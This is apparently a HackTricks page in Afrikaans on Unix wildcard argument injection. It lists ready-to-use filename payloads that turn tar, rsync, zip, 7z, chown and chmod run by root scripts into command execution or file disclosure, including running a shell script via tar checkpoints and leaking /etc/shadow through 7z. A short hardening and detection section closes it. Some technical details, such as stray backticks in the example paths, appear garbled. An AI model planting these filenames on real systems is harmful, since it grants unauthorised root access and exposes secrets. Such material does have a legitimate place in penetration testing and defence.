# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (ook bekend as *glob*) **argumentinjekie** gebeur wanneer 'n bevoorregte skrif 'n Unix-binary soos `tar`, `chown`, `rsync`, `zip`, `7z`, … met 'n ongekwote wildcard soos `*` uitvoer. 
> Aangesien die shell die wildcard **voor** die uitvoering van die binary uitbrei, kan 'n aanvaller wat lêers in die werksgids kan skep, lêername saamstel wat met `-` begin sodat dit as **opsies in plaas van data** geïnterpreteer word, wat effektief arbitrêre vlae of selfs opdragte smokkel. 
> Hierdie bladsy versamel die nuttigste primitiewe, onlangse navorsing en moderne opsporings vir 2023-2025.

## chown / chmod

Jy kan **die eienaar/groep of die toestemmingsbits van 'n arbitrêre lêer kopieer** deur die `--reference` vlag te misbruik:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wanneer root later iets soos uitvoer:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` word ingesluit, wat veroorsaak dat *alle* ooreenstemmende lêers die eienaarskap/permitte van `/root/secret``file` erf.

*PoC & hulpmiddel*: [`wildpwn`](https://github.com/localh0t/wildpwn) (gecombineerde aanval).
Sien ook die klassieke DefenseCode papier vir besonderhede.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Voer arbitrêre opdragte uit deur die **checkpoint** kenmerk te misbruik:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Sodra root `tar -czf /root/backup.tgz *` uitvoer, word `shell.sh` as root uitgevoer.

### bsdtar / macOS 14+

Die standaard `tar` op onlangse macOS (gebaseer op `libarchive`) implementeer *nie* `--checkpoint` nie, maar jy kan steeds kode-uitvoering bereik met die **--use-compress-program** vlag wat jou toelaat om 'n eksterne kompressor te spesifiseer.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wanneer 'n bevoorregte skrif `tar -cf backup.tar *` uitvoer, sal `/bin/sh` begin.

---

## rsync

`rsync` laat jou toe om die afstandshell of selfs die afstandsbinary te oorskry via opdraglynvlaggies wat met `-e` of `--rsync-path` begin:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
As root later argiveer die gids met `rsync -az * backup:/srv/`, die ingeslote vlag laat jou shell op die afstand kant ontstaan.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` modus).

---

## 7-Zip / 7z / 7za

Selfs wanneer die bevoorregte skrip *defensief* die wildcard met `--` voorafgaan (om opsie-parsing te stop), ondersteun die 7-Zip formaat **lêerlys lêers** deur die lêernaam met `@` vooraf te gaan. Om dit te kombineer met 'n symlink laat jou toe om *arbitraire lêers te exfiltreer*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
As die root iets soos uitvoer:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip sal probeer om `root.txt` (→ `/etc/shadow`) as 'n lêerlys te lees en sal uitval, **die inhoud na stderr druk**.

---

## zip

`zip` ondersteun die vlag `--unzip-command` wat *woordeliks* aan die stelselshell oorgedra word wanneer die argief getoets sal word:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Inject die vlag via 'n vervaardigde lêernaam en wag vir die bevoorregte rugsteun-skrip om `zip -T` (toets argief) op die resultaat lêer aan te roep.

---

## Bykomende binaire wat kwesbaar is vir wildcard-inspuiting (2023-2025 vinnige lys)

Die volgende opdragte is in moderne CTFs en werklike omgewings misbruik. Die payload word altyd geskep as 'n *lêernaam* binne 'n skryfbare gids wat later met 'n wildcard verwerk sal word:

| Binaire | Vlag om te misbruik | Effek |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrêre `@file` | Lees lêerinhoud |
| `flock` | `-c <cmd>` | Voer opdrag uit |
| `git`   | `-c core.sshCommand=<cmd>` | Opdrag uitvoering via git oor SSH |
| `scp`   | `-S <cmd>` | Begin arbitrêre program in plaas van ssh |

Hierdie primitiewe is minder algemeen as die *tar/rsync/zip* klassiekers, maar dit is die moeite werd om te kyk wanneer jy jag.

---

## Opsporing & Versterking

1. **Deaktiveer shell globbing** in kritieke skripte: `set -f` (`set -o noglob`) voorkom wildcard uitbreiding.
2. **Aanhaal of ontsnap** argumente: `tar -czf "$dst" -- *` is *nie* veilig nie — verkies `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Expliciete paaie**: Gebruik `/var/www/html/*.log` in plaas van `*` sodat aanvallers nie susterlêers kan skep wat met `-` begin nie.
4. **Minste voorreg**: Voer rugsteun/onderhoud take uit as 'n nie-bevoorregte diensrekening in plaas van root wanneer moontlik.
5. **Monitering**: Elastic se voorafgeboude reël *Potensiële Shell via Wildcard-inspuiting* soek na `tar --checkpoint=*`, `rsync -e*`, of `zip --unzip-command` onmiddellik gevolg deur 'n shell-kind proses. Die EQL-navraag kan aangepas word vir ander EDRs.

---

## Verwysings

* Elastic Security – Potensiële Shell via Wildcard-inspuiting Gedetecteerde reël (laas opgedateer 2025)
* Rutger Flohil – “macOS — Tar wildcard-inspuiting” (18 Des 2024)

{{#include ../../banners/hacktricks-training.md}}
